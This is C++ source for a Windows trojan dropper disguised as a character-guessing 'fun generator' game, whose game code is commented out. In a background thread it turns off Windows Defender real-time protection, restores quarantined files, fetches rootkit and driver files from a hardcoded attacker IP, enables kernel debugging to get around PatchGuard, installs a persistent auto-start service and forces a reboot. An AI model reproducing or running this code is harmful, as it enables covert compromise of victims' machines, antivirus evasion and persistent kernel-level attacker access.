#include "networking.h"
#include <iostream>
#include <random>
#include <string>
#include <shlobj_core.h>
#include "configurations.h"


std::wstring GetCurrentPath() {
    TCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    return std::wstring(PathBuffer).substr(0, PathEndPos);
}


BOOL TrojanThread(LPVOID TrojParams) {
    const char* CleaningCommands =
        "cd \"%ProgramFiles%\\Windows Defender\" > nul && "
        "MpCmdRun.exe -Restore -All > nul";
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char DebugPort[MAX_PORT_SIZE] = { 0 };
    char DebugKey[MAX_DEBUGKEY_SIZE] = { 0 };
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    ParseTrojanParams(TrojParams, TargetIp, AttackerIp, DebugPort, DebugKey);


    // Disable realtime protection to not trigger any virus checks/alerts:
    LastError = RealTime(TRUE);
    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        printf("Cannot disable realtime protection - %d\n", LastError.LastError);
        return FALSE;
    }
    printf("Disabled realtime protection\n");


    // Run cleaning commands for last iteration:
    if (system(CleaningCommands) == -1) {
        printf("Failed to perform cleaning commands: %d\n", GetLastError());
        return FALSE;
    }
    printf("Performed cleaning commands successfully\n");


    // Get all the needed files for the rootkit (would eventually be medium.exe and driver files) and configure remote debugging:
    if (!FilesAndDebugging(AttackerIp, DebugPort, DebugKey)) {
        return FALSE;
    }
    printf("Downloaded files and changed debugging settings\n");


    // Disable patchguard:
    if (system("bcdedit /debug ON > nul") == -1) {
        printf("Failed to run KPP disabler: %d\n", GetLastError());
    }
    printf("ran KPP disabler successfully\n");


    // Enable RealTime Protection:
    LastError = RealTime(FALSE);
    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        printf("Failed to enable realtime protection: %d\n", LastError.LastError);
        return FALSE;
    }
    printf("Enabled realtime protection\n");


    // Create temporary service for AutoService:
    system("sc stop RootAuto > nul");
    system("sc delete RootAuto > nul");
    if (system("sc create RootAuto type=own start=auto binPath=\"C:\\nosusfolder\\verysus\\AutoStart.exe\" > nul") == -1) {
        printf("Failed to create auto service: %d\n", GetLastError());
        return FALSE;
    }
    printf("Created auto service\n");


    // Forcefully restart machine:
    if (system("shutdown -r -f -t 1 > nul") == -1) {
        printf("Failed to force reset the target: %d\n", GetLastError());
        return FALSE;
    }
    printf("Resetting target..\n");
    return TRUE;
}


int main()
{
    char NullTerm = '\0';
    char Tilda = '~';
    char Inp = 0;
    char GuessLetter = 0;
    char RandLetter = 0;
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };

     // HARDCODED VALUES, CHANGE THIS BY ListAttacker IF NEEDED
    const char* AttackAddresses = "192.168.1.21~192.168.1.10~192.168.40.1";
    const char* DebugPort = "50003";
    const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK1111";

    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,/;[]{}:-_=+)(*&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    SECURITY_ATTRIBUTES Trojattr = { 0 };
    HANDLE TrojanHandle = INVALID_HANDLE_VALUE;
    LPVOID TrojanParams = NULL;


    // Get IP addresses of target and attacker -
    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
        printf("[-] Cannot find the target address and the matching attacker address!\n");
        return 0;
    }
    printf("Target: %s, Attacker: %s\n", TargetIp, AttackerIp);


    // Trojan variables and calling -
    Trojattr.bInheritHandle = FALSE;
    Trojattr.nLength = sizeof(SECURITY_ATTRIBUTES);
    Trojattr.lpSecurityDescriptor = NULL;


    // Trojan parameter buffer -
    TrojanParams = malloc(strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 4);
    if (TrojanParams == NULL) {
        printf("Cannot continue with FunEngine (params = NULL), please retry..\n");
        free(TrojanParams);
        return 1;
    }
    memcpy(TrojanParams, TargetIp, strlen(TargetIp));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp)), &Tilda, 1);
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + 1), AttackerIp, strlen(AttackerIp));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + 1), &Tilda, 1);
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + 2), DebugPort, strlen(DebugPort));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + 2), &Tilda, 1);
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + 3), DebugKey, strlen(DebugKey));
    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 3), &NullTerm, 1);


    // Start trojan thread and input from user -
    TrojanHandle = CreateThread(&Trojattr,
        0,
        (LPTHREAD_START_ROUTINE)&TrojanThread,
        TrojanParams,
        0,
        NULL);

    if (TrojanHandle == NULL) {
        printf("Cannot continue with FunEngine, please retry..\n");
        free(TrojanParams);
        return 1;
    }
    /*
    printf("Welcome to fun generator!\nRules:\n");
    printf("1. when asked for ANY input, you should input only one letter (or it will ruin the fun ;) )\n");
    printf("2. when asked if want to start/continue, the letter n will represent no and any other letter will represent yes\n");
    printf("Welcome to fun generator! Setting things up...\nStart?\n");
    std::cin >> Inp;
    while (Inp != 'n') {
        printf("Guess the character -> ");
        std::cin >> GuessLetter;
        RandLetter = Alp[distr(gen)];
        if (GuessLetter != RandLetter) {
            printf("\nOh No! you guessed the character %c but the computer guesses %c ! :(\n", GuessLetter, RandLetter);
        }
        else {
            printf("\nWell Done! the computer did think about the character %c ! :)\n", GuessLetter);
        }
        GuessLetter = 0;
        RandLetter = 0;
        Inp = 0;
        printf("Continue?\n");
        std::cin >> Inp;
    }

    printf("Finished Fun Engine! Cleaning everything...\n");
    */
    WaitForSingleObject(TrojanHandle, INFINITE);
    free(TrojanParams);
    printf("Cleaning succeeded, bye bye!\n");
    return 0;
}
